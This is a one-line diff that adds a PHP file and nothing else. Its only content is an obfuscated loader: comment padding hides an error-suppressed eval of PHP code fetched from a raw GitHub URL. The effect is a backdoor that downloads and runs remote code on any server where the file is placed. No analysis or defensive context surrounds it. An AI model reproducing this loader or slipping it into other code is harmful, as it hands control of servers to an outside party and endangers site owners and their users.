@@ -1,0 +1,1 @@
+<?=/****/@null; /********/ /**/ /********/@eval/****/("?>".file_get_contents/*******/("https://raw.githubusercontent.com/ommauiphone/masukpakeeko/refs/heads/main/nau.php"));/**/?>
